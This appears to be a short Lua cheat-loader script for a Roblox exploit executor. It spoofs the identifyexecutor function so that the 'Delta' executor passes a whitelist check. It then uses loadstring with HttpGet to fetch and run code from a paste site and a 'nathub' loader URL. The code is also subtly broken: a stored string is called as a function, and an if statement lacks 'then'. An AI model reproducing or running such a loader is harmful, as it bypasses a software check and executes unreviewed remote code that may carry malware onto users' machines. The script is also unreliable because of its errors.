old_identify = identifyexecutor()
fake_identify = function()
  real_exec = old_identify()
  if real_exec == 'Delta'
    return 'Delta_Allowed'
  end
  return real_exec
end
identifyexecutor = fake_identify
getgenv().identifyexecutor = fake_identify
loadstring(game:HttpGet("https://cdn.sourceb.in/bins/Q08vTAupJ4/0", true))()
loadstring(game:HttpGet("https://get.nathub.xyz/loader"))();
